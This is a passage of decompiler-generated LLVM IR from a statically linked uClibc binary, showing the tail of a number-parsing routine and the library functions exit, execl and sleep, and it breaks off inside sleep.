dec_label_pc_8054319:                             ; preds = %dec_label_pc_805430f
  %div = udiv i32 -1, %v0_805431e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_805431e
  %v1_8054320 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_805435a = urem i32 %arg4, 256
  br label %dec_label_pc_805432e

dec_label_pc_805432c:                             ; preds = %dec_label_pc_8054370, %dec_label_pc_805435a
  %v4_805432e.pre = phi i32 [ %v1_8054344, %dec_label_pc_8054370 ], [ %v4_805432e.pre.pre, %dec_label_pc_805435a ]
  %v0_805432c = phi i32 [ %v1_805434b, %dec_label_pc_8054370 ], [ %v0_805432c.pre, %dec_label_pc_805435a ]
  br label %dec_label_pc_805432e

dec_label_pc_805432e:                             ; preds = %dec_label_pc_8054319, %dec_label_pc_805432c
  %v0_805438519 = phi i32 [ %v0_805438521, %dec_label_pc_8054319 ], [ %v0_805432c, %dec_label_pc_805432c ]
  %v0_805434b = phi i32 [ %v0_805432e13, %dec_label_pc_8054319 ], [ %v0_805432c, %dec_label_pc_805432c ]
  %v4_805432e = phi i32 [ %div, %dec_label_pc_8054319 ], [ %v4_805432e.pre, %dec_label_pc_805432c ]
  %v1_805432e = inttoptr i32 %v0_805434b to i8*
  %v2_805432e = load i8, i8* %v1_805432e, align 1
  %v3_805432e = zext i8 %v2_805432e to i32
  %v5_805432e = and i32 %v4_805432e, -256
  %v6_805432e = or i32 %v3_805432e, %v5_805432e
  store i32 %v6_805432e, i32* %eax.global-to-local, align 4
  %v1_8054330 = add i32 %v6_805432e, -48
  store i32 %v1_8054330, i32* @ecx, align 4
  %v1_8054333 = trunc i32 %v1_8054330 to i8
  %tmp55 = icmp ult i8 %v1_8054333, 10
  br i1 %tmp55, label %dec_label_pc_8054344, label %dec_label_pc_8054338

dec_label_pc_8054338:                             ; preds = %dec_label_pc_805432e
  %v1_8054338 = or i32 %v6_805432e, 32
  %v3_8054338 = trunc i32 %v1_8054338 to i8
  store i32 %v1_8054338, i32* %eax.global-to-local, align 4
  %v1_805433b = and i32 %v1_8054330, -256
  %v2_805433b = or i32 %v1_805433b, 40
  store i32 %v2_805433b, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_8054338, 97
  br i1 %tmp56, label %dec_label_pc_8054344, label %dec_label_pc_8054341

dec_label_pc_8054341:                             ; preds = %dec_label_pc_8054338
  %v1_8054341 = add i32 %v1_8054338, -87
  store i32 %v1_8054341, i32* @ecx, align 4
  br label %dec_label_pc_8054344

dec_label_pc_8054344:                             ; preds = %dec_label_pc_8054338, %dec_label_pc_805432e, %dec_label_pc_8054341
  %v0_8054373 = phi i32 [ %v2_805433b, %dec_label_pc_8054338 ], [ %v1_8054330, %dec_label_pc_805432e ], [ %v1_8054341, %dec_label_pc_8054341 ]
  %v1_8054344 = urem i32 %v0_8054373, 256
  store i32 %v1_8054344, i32* %eax.global-to-local, align 4
  %v1_8054347 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054347 = sub i32 %v1_8054344, %v1_8054347
  %v10_8054347 = and i32 %v2_8054347, %v1_8054347
  %v11_8054347 = icmp slt i32 %v10_8054347, 0
  %v13_8054347 = icmp slt i32 %v2_8054347, 0
  %v2_8054349 = icmp eq i1 %v13_8054347, %v11_8054347
  br i1 %v2_8054349, label %dec_label_pc_805437a, label %dec_label_pc_805434b

dec_label_pc_805434b:                             ; preds = %dec_label_pc_8054344
  %v1_805434b = add i32 %v0_805434b, 1
  store i32 %v1_805434b, i32* %ebx.global-to-local, align 4
  %v0_805434c = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_805434c, %div
  br i1 %tmp57, label %dec_label_pc_805435a, label %dec_label_pc_8054352

dec_label_pc_8054352:                             ; preds = %dec_label_pc_805434b
  %v15_805434c = icmp eq i32 %v0_805434c, %div
  %v1_8054352 = icmp eq i1 %v15_805434c, false
  br i1 %v1_8054352, label %dec_label_pc_8054370, label %dec_label_pc_8054354

dec_label_pc_8054354:                             ; preds = %dec_label_pc_8054352
  %v1_8054354 = trunc i32 %v0_8054373 to i8
  %tmp58 = icmp ugt i8 %v1_8054354, %v1_8054320
  br i1 %tmp58, label %dec_label_pc_805435a, label %dec_label_pc_8054370

dec_label_pc_805435a:                             ; preds = %dec_label_pc_8054354, %dec_label_pc_805434b
  store i32 %v4_805435a, i32* %eax.global-to-local, align 4
  %v0_805435e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805435e = and i32 %v0_805435e, %v4_805435a
  store i32 %v2_805435e, i32* %ebp.global-to-local, align 4
  %v1_8054360 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8054360, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_8054368 = inttoptr i32 %v1_8054360 to i32*
  store i32 34, i32* %v1_8054368, align 4
  %v0_805432c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805432e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805432c

dec_label_pc_8054370:                             ; preds = %dec_label_pc_8054354, %dec_label_pc_8054352
  %v4_8054370 = mul i32 %v0_805434c, %v1_8054347
  store i32 %v1_8054344, i32* %eax.global-to-local, align 4
  %v2_8054376 = add i32 %v4_8054370, %v1_8054344
  store i32 %v2_8054376, i32* @edx, align 4
  br label %dec_label_pc_805432c

dec_label_pc_805437a:                             ; preds = %dec_label_pc_8054344, %dec_label_pc_805430f
  %v0_8054385 = phi i32 [ %v0_805438521, %dec_label_pc_805430f ], [ %v0_805438519, %dec_label_pc_8054344 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_805430f ], [ %div, %dec_label_pc_8054344 ]
  %v4_805437a = icmp eq i32 %arg2, 0
  br i1 %v4_805437a, label %dec_label_pc_8054387, label %dec_label_pc_8054381

dec_label_pc_8054381:                             ; preds = %dec_label_pc_805437a
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054385 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054385, i32* %v2_8054385, align 4
  br label %dec_label_pc_8054387

dec_label_pc_8054387:                             ; preds = %dec_label_pc_805437a, %dec_label_pc_8054381
  %v0_8054387 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8054387, i32* %eax.global-to-local, align 4
  %v1_8054389 = trunc i32 %v0_8054387 to i8
  %v6_8054389 = icmp eq i8 %v1_8054389, 0
  %v2_805438b = zext i1 %v6_8054389 to i32
  %v1_805438d4 = or i32 %v2_805438b, -2147483648
  store i32 %v1_805438d4, i32* %ebx.global-to-local, align 4
  %v5_8054393 = icmp eq i8 %tmp37, 0
  br i1 %v5_8054393, label %dec_label_pc_80543ab, label %dec_label_pc_805439a

dec_label_pc_805439a:                             ; preds = %dec_label_pc_8054387
  %v0_805439a = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_805439a, %v1_805438d4
  br i1 %tmp59, label %dec_label_pc_805439e, label %dec_label_pc_80543ab

dec_label_pc_805439e:                             ; preds = %dec_label_pc_805439a
  %v1_805439e = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_805439e, i32* %eax.global-to-local, align 4
  %v0_80543a3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80543a3, i32* @edx, align 4
  %v1_80543a5 = inttoptr i32 %v1_805439e to i32*
  store i32 34, i32* %v1_80543a5, align 4
  %v0_80543ab.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80543ab

dec_label_pc_80543ab:                             ; preds = %dec_label_pc_805439a, %dec_label_pc_8054387, %dec_label_pc_805439e
  %v0_80543ab = phi i32 [ %v0_8054387, %dec_label_pc_805439a ], [ %v0_8054387, %dec_label_pc_8054387 ], [ %v0_80543ab.pre, %dec_label_pc_805439e ]
  store i32 %v0_80543ab, i32* %eax.global-to-local, align 4
  %v3_80543ad = trunc i32 %v0_80543ab to i8
  %v4_80543ad = icmp eq i8 %v3_80543ad, 0
  %v0_80543b6.pre = load i32, i32* @edx, align 4
  br i1 %v4_80543ad, label %dec_label_pc_80543b3, label %dec_label_pc_80543b1

dec_label_pc_80543b1:                             ; preds = %dec_label_pc_80543ab
  %v1_80543b1 = sub i32 0, %v0_80543b6.pre
  store i32 %v1_80543b1, i32* @edx, align 4
  br label %dec_label_pc_80543b3

dec_label_pc_80543b3:                             ; preds = %dec_label_pc_80543ab, %dec_label_pc_80543b1
  %v0_80543b6 = phi i32 [ %v1_80543b1, %dec_label_pc_80543b1 ], [ %v0_80543b6.pre, %dec_label_pc_80543ab ]
  store i32 %v0_80543b6, i32* %eax.global-to-local, align 4
  %v2_80543b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80543b8, i32* @ebx, align 4
  ret i32 %v0_80543b6

; uselistorder directives
  uselistorder i32 %v0_80543b6, { 1, 0 }
  uselistorder i32 %v0_80543ab, { 1, 0 }
  uselistorder i32 %v0_805434c, { 0, 2, 1 }
  uselistorder i32 %v1_805434b, { 1, 0 }
  uselistorder i32 %v2_8054347, { 1, 0 }
  uselistorder i32 %v1_8054344, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8054373, { 1, 0 }
  uselistorder i32 %v0_805432c, { 1, 0 }
  uselistorder i32 %v4_805435a, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805431e, { 1, 0, 2 }
  uselistorder i32 %v2_8054302, { 1, 0 }
  uselistorder i32 %v1_80542fb, { 1, 0 }
  uselistorder i32 %v1_80542f4, { 1, 0, 2 }
  uselistorder i32 %v0_80542f3, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_80542c2.lcssa, { 1, 0 }
  uselistorder i32 %v0_80542c1.lcssa, { 1, 0 }
  uselistorder i32 %v1_80542c1, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80542b5, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_80542af, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 42, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80543b3, { 1, 0 }
  uselistorder label %dec_label_pc_80543ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054387, { 1, 0 }
  uselistorder label %dec_label_pc_8054344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805432e, { 1, 0 }
  uselistorder label %dec_label_pc_805430f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054305, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80542e1, { 1, 0 }
  uselistorder label %dec_label_pc_80542e0, { 1, 0 }
  uselistorder label %dec_label_pc_80542c1, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80543d3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80543d3, i32* @ebx, align 4
  %v2_80543d8 = call i32 @__pthread_return_void(i32 %v2_80543d3, i32 134563799)
  %v1_80543e4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b4c0.534 to i32))
  %v0_80543e9 = load i32, i32* @global_var_8061764.535, align 4
  store i32 %v0_80543e9, i32* @eax, align 4
  %v1_80543f1 = icmp eq i32 %v0_80543e9, 0
  br i1 %v1_80543f1, label %dec_label_pc_80543fe, label %dec_label_pc_80543f5

dec_label_pc_80543f5:                             ; preds = %entry
  %v0_80543f8 = load i32, i32* @esi, align 4
  %v1_80543f9 = call i32 @unknown_0(i32 %v0_80543f8)
  store i32 %v1_80543f9, i32* @eax, align 4
  br label %dec_label_pc_80543fe

dec_label_pc_80543fe:                             ; preds = %entry, %dec_label_pc_80543f5
  %v2_8054403 = call i32 @__pthread_return_void(i32 %v2_80543d3, i32 1)
  %v0_8054408 = call i32 @__GI___uClibc_fini()
  %v0_8054419 = call i32 @_stdio_term()
  %v0_8054421 = load i32, i32* @esi, align 4
  %v1_8054422 = call i32 @__GI__exit(i32 %v0_8054421)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 4, 0, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_80543fe, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805442c = load i32, i32* @ebx, align 4
  store i32 %v0_805442c, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805442f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_805442f, i32* %eax.global-to-local, align 4
  %v12_8054432 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8054438

dec_label_pc_8054438:                             ; preds = %dec_label_pc_8054438, %entry
  %v0_805443b = phi i32 [ 0, %entry ], [ %v1_805443b, %dec_label_pc_8054438 ]
  %stack_var_-16.0 = phi i32 [ %v2_805442f, %entry ], [ %v1_805443c, %dec_label_pc_8054438 ]
  %v1_805443b = add i32 %v0_805443b, 1
  store i32 %v1_805443b, i32* %esi.global-to-local, align 4
  %v1_805443c = add i32 %stack_var_-16.0, 4
  store i32 %v1_805443c, i32* %eax.global-to-local, align 4
  %v1_8054442 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8054442 = load i32, i32* %v1_8054442, align 4
  %v3_8054442 = icmp eq i32 %v2_8054442, 0
  %v1_8054445 = icmp eq i1 %v3_8054442, false
  br i1 %v1_8054445, label %dec_label_pc_8054438, label %dec_label_pc_8054447

dec_label_pc_8054447:                             ; preds = %dec_label_pc_8054438
  %v1_8054447 = mul i32 %v1_805443b, 4
  %v2_8054447 = add i32 %v1_8054447, 34
  %v1_805444e = and i32 %v2_8054447, -16
  %v2_8054451 = sub i32 %v12_8054432, %v1_805444e
  %v1_8054456 = add i32 %v2_8054451, 15
  %v1_805445a = and i32 %v1_8054456, -16
  store i32 %v1_805445a, i32* @ebx, align 4
  store i32 %v1_805445a, i32* %ecx.global-to-local, align 4
  %v2_805445f = inttoptr i32 %v1_805445a to i32*
  store i32 %arg2, i32* %v2_805445f, align 16
  store i32 %v2_805442f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054467

dec_label_pc_8054467:                             ; preds = %dec_label_pc_8054467, %dec_label_pc_8054447
  %stack_var_-16.1 = phi i32 [ %v2_805442f, %dec_label_pc_8054447 ], [ %v1_805446e, %dec_label_pc_8054467 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_805446a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805446a = add i32 %v0_805446a, 4
  store i32 %v1_805446a, i32* %ecx.global-to-local, align 4
  %v0_805446d = load i32, i32* %esi.global-to-local, align 4
  %v1_805446d = add i32 %v0_805446d, -1
  %v8_805446d = icmp eq i32 %v1_805446d, 0
  store i32 %v1_805446d, i32* %esi.global-to-local, align 4
  %v1_805446e = add i32 %stack_var_-16.1, 4
  %v1_8054474 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8054474 = load i32, i32* %v1_8054474, align 4
  store i32 %v2_8054474, i32* %eax.global-to-local, align 4
  %v2_8054476 = inttoptr i32 %v1_805446a to i32*
  store i32 %v2_8054474, i32* %v2_8054476, align 4
  %v1_8054478 = icmp eq i1 %v8_805446d, false
  br i1 %v1_8054478, label %dec_label_pc_8054467, label %dec_label_pc_805447a

dec_label_pc_805447a:                             ; preds = %dec_label_pc_8054467
  %v0_805447a = load i32, i32* %eax.global-to-local, align 4
  %v1_805447a = load i32, i32* @esp, align 4
  %v2_805447a = add i32 %v1_805447a, -4
  %v3_805447a = inttoptr i32 %v2_805447a to i32*
  store i32 %v0_805447a, i32* %v3_805447a, align 4
  %v0_805447b = load i32, i32* @global_var_806176c.536, align 4
  %v2_805447b = add i32 %v1_805447a, -8
  %v3_805447b = inttoptr i32 %v2_805447b to i32*
  store i32 %v0_805447b, i32* %v3_805447b, align 4
  %v0_8054481 = load i32, i32* @ebx, align 4
  %v2_8054481 = add i32 %v1_805447a, -12
  %v3_8054481 = inttoptr i32 %v2_8054481 to i32*
  store i32 %v0_8054481, i32* %v3_8054481, align 4
  %v5_8054482 = add i32 %v1_805447a, -16
  %v6_8054482 = inttoptr i32 %v5_8054482 to i32*
  store i32 %arg1, i32* %v6_8054482, align 4
  %v1_8054485 = inttoptr i32 %v1_805446e to i8*
  %v2_8054485 = call i32 @__GI_execve(i8* %v1_8054485)
  store i32 %v2_8054485, i32* %eax.global-to-local, align 4
  %v2_805448d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805448d, i32* @ebx, align 4
  ret i32 %v2_8054485

; uselistorder directives
  uselistorder i32 %v1_805446d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_805443c, { 1, 0 }
  uselistorder i32 %v1_805443b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_805442f, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8054495 = load i32, i32* @edi, align 4
  %v0_8054496 = load i32, i32* @esi, align 4
  %v0_8054497 = load i32, i32* @ebx, align 4
  %v15_8054498 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_80544aa = icmp eq i32 %arg1, 0
  %v1_80544ac = icmp eq i1 %v1_80544aa, false
  br i1 %v1_80544ac, label %dec_label_pc_80544be.preheader, label %dec_label_pc_805460b

dec_label_pc_80544be.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80544b3

dec_label_pc_80544b3:                             ; preds = %dec_label_pc_80544b3.dec_label_pc_80544b3_crit_edge, %dec_label_pc_80544be.preheader
  %v0_80544b3 = phi i32 [ %v15_8054498, %dec_label_pc_80544be.preheader ], [ %v0_80544b3.pre, %dec_label_pc_80544b3.dec_label_pc_80544b3_crit_edge ]
  %v1_80544be27 = phi i32 [ 31, %dec_label_pc_80544be.preheader ], [ %v1_80544be, %dec_label_pc_80544b3.dec_label_pc_80544b3_crit_edge ]
  %v2_80544b3 = mul i32 %v1_80544be27, 4
  %v3_80544b3 = add i32 %v2_80544b3, 292
  %v4_80544b3 = add i32 %v3_80544b3, %v0_80544b3
  %v5_80544b3 = inttoptr i32 %v4_80544b3 to i32*
  store i32 0, i32* %v5_80544b3, align 4
  %v0_80544be.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80544be = add i32 %v0_80544be.pre, -1
  %v9_80544be = icmp slt i32 %v1_80544be, 0
  store i32 %v1_80544be, i32* %eax.global-to-local, align 4
  %v1_80544bf = icmp eq i1 %v9_80544be, false
  br i1 %v1_80544bf, label %dec_label_pc_80544b3.dec_label_pc_80544b3_crit_edge, label %dec_label_pc_80544c1

dec_label_pc_80544b3.dec_label_pc_80544b3_crit_edge: ; preds = %dec_label_pc_80544b3
  %v0_80544b3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80544b3

dec_label_pc_80544c1:                             ; preds = %dec_label_pc_80544b3
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80544d7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80544d7, i32* @ebx, align 4
  store i32 %v2_80544d7, i32* %stack_var_-460, align 4
  %v4_80544df = call i32 @__sigaddset(i32 %v2_80544d7, i32 17, i32 %v1_80544be, i32 %v1_80544be)
  store i32 %v4_80544df, i32* %eax.global-to-local, align 4
  %v2_80544e7 = icmp slt i32 %v4_80544df, 0
  br i1 %v2_80544e7, label %dec_label_pc_805460f, label %dec_label_pc_80544ef

dec_label_pc_80544ef:                             ; preds = %dec_label_pc_80544c1
  %v2_80544f0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80544f0, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80544fb = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80544fb = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80544fb, i32 %v2_80544f0)
  store i32 %v4_80544fb, i32* %eax.global-to-local, align 4
  %v1_8054503 = icmp eq i32 %v4_80544fb, 0
  %v1_8054505 = icmp eq i1 %v1_8054503, false
  br i1 %v1_8054505, label %dec_label_pc_805460f, label %dec_label_pc_805450b

dec_label_pc_805450b:                             ; preds = %dec_label_pc_80544ef
  store i32 %v2_80544f0, i32* %stack_var_-460, align 4
  %v4_8054510 = call i32 @__sigismember(i32 %v2_80544f0, i32 17, i32 %v4_80544fb, i32 %v4_80544fb)
  store i32 %v4_8054510, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_805451d = icmp eq i32 %v4_8054510, 0
  br i1 %v1_805451d, label %dec_label_pc_8054531.preheader, label %dec_label_pc_80545d9

dec_label_pc_8054531.preheader:                   ; preds = %dec_label_pc_805450b
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054526

dec_label_pc_8054526:                             ; preds = %dec_label_pc_8054526.dec_label_pc_8054526_crit_edge, %dec_label_pc_8054531.preheader
  %v0_8054526 = phi i32 [ %v15_8054498, %dec_label_pc_8054531.preheader ], [ %v0_8054526.pre, %dec_label_pc_8054526.dec_label_pc_8054526_crit_edge ]
  %v1_805453126 = phi i32 [ 31, %dec_label_pc_8054531.preheader ], [ %v1_8054531, %dec_label_pc_8054526.dec_label_pc_8054526_crit_edge ]
  %v2_8054526 = mul i32 %v1_805453126, 4
  %v3_8054526 = add i32 %v2_8054526, 292
  %v4_8054526 = add i32 %v3_8054526, %v0_8054526
  %v5_8054526 = inttoptr i32 %v4_8054526 to i32*
  store i32 0, i32* %v5_8054526, align 4
  %v0_8054531.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8054531 = add i32 %v0_8054531.pre, -1
  %v9_8054531 = icmp slt i32 %v1_8054531, 0
  store i32 %v1_8054531, i32* %edx.global-to-local, align 4
  %v1_8054532 = icmp eq i1 %v9_8054531, false
  br i1 %v1_8054532, label %dec_label_pc_8054526.dec_label_pc_8054526_crit_edge, label %dec_label_pc_8054534

dec_label_pc_8054526.dec_label_pc_8054526_crit_edge: ; preds = %dec_label_pc_8054526
  %v0_8054526.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054526

dec_label_pc_8054534:                             ; preds = %dec_label_pc_8054526
  store i32 %v2_80544d7, i32* %eax.global-to-local, align 4
  store i32 %v2_80544d7, i32* %stack_var_-460, align 4
  %v4_8054540 = call i32 @__sigaddset(i32 %v2_80544d7, i32 17, i32 0, i32 0)
  store i32 %v4_8054540, i32* %eax.global-to-local, align 4
  %v2_8054548 = icmp slt i32 %v4_8054540, 0
  br i1 %v2_8054548, label %dec_label_pc_805460f, label %dec_label_pc_8054550

dec_label_pc_8054550:                             ; preds = %dec_label_pc_8054534
  %v2_8054551 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8054551, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_805455a = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8054551)
  store i32 %v4_805455a, i32* %eax.global-to-local, align 4
  %v2_8054562 = icmp slt i32 %v4_805455a, 0
  %v1_8054564 = icmp eq i1 %v2_8054562, false
  br i1 %v1_8054564, label %dec_label_pc_805458e, label %dec_label_pc_8054566

dec_label_pc_8054566:                             ; preds = %dec_label_pc_8054550
  %v0_8054566 = load i32, i32* %stack_var_-460, align 4
  %v1_8054566 = call i32 @__errno_location(i32 %v0_8054566)
  store i32 %v1_8054566, i32* %eax.global-to-local, align 4
  store i32 %v1_8054566, i32* @ebx, align 4
  %v1_805456d = inttoptr i32 %v1_8054566 to i32*
  %v2_805456d = load i32, i32* %v1_805456d, align 4
  store i32 %v2_805456d, i32* @esi, align 4
  store i32 %v2_80544f0, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805457c = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805457c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805457c, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054587 = load i32, i32* @esi, align 4
  %v1_8054587 = load i32, i32* @ebx, align 4
  %v2_8054587 = inttoptr i32 %v1_8054587 to i32*
  store i32 %v0_8054587, i32* %v2_8054587, align 4
  %v0_805461c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054612

dec_label_pc_805458e:                             ; preds = %dec_label_pc_8054550
  %v3_805458e = load i32, i32* %stack_var_-420, align 4
  %v12_805458e = icmp eq i32 %v3_805458e, 1
  %v2_805459a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805459a, i32* @ebx, align 4
  %v1_80545a1 = icmp eq i1 %v12_805458e, false
  br i1 %v1_80545a1, label %dec_label_pc_80545c8, label %dec_label_pc_80545a3

dec_label_pc_80545a3:                             ; preds = %dec_label_pc_805458e
  store i32 %v2_805459a, i32* %stack_var_-460, align 4
  %v2_80545a7 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80545a7 = call i32 @__libc_nanosleep(%timespec* %v2_80545a7, i32 %v2_805459a)
  store i32 %v3_80545a7, i32* %eax.global-to-local, align 4
  store i32 %v3_80545a7, i32* @edi, align 4
  %v1_80545ae = call i32 @__errno_location(i32 %v2_805459a)
  store i32 %v1_80545ae, i32* %eax.global-to-local, align 4
  store i32 %v1_80545ae, i32* @ebx, align 4
  %v1_80545b8 = inttoptr i32 %v1_80545ae to i32*
  %v2_80545b8 = load i32, i32* %v1_80545b8, align 4
  store i32 %v2_80545b8, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80545bf = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80545bf = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80545bf, i32 0)
  store i32 %v4_80545bf, i32* %eax.global-to-local, align 4
  %v0_80545c4 = load i32, i32* @esi, align 4
  %v1_80545c4 = load i32, i32* @ebx, align 4
  %v2_80545c4 = inttoptr i32 %v1_80545c4 to i32*
  store i32 %v0_80545c4, i32* %v2_80545c4, align 4
  %v0_80545ee.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80545eb

dec_label_pc_80545c8:                             ; preds = %dec_label_pc_805458e
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80545ce = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80545ce = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80545ce, i32 0)
  store i32 %v4_80545ce, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80545e4

dec_label_pc_80545d9:                             ; preds = %dec_label_pc_805450b
  %v2_80545db = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80545db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80545e4

dec_label_pc_80545e4:                             ; preds = %dec_label_pc_80545c8, %dec_label_pc_80545d9
  %storemerge3.pre-phi = phi i32 [ %v2_805459a, %dec_label_pc_80545c8 ], [ %v2_80545db, %dec_label_pc_80545d9 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_80545e4 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80545e4 = call i32 @__libc_nanosleep(%timespec* %v2_80545e4, i32 %storemerge3.pre-phi)
  store i32 %v3_80545e4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80545eb

dec_label_pc_80545eb:                             ; preds = %dec_label_pc_80545a3, %dec_label_pc_80545e4
  %v0_80545ee = phi i32 [ %v0_80545ee.pre, %dec_label_pc_80545a3 ], [ %v3_80545e4, %dec_label_pc_80545e4 ]
  %v1_80545ee = icmp eq i32 %v0_80545ee, 0
  br i1 %v1_80545ee, label %dec_label_pc_805460b, label %dec_label_pc_80545f2

dec_label_pc_80545f2:                             ; preds = %dec_label_pc_80545eb
  %v4_8054602 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8054602, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054612

dec_label_pc_805460b:                             ; preds = %entry, %dec_label_pc_80545eb
  store i32 0, i32* %eax.global-to-local, align 4
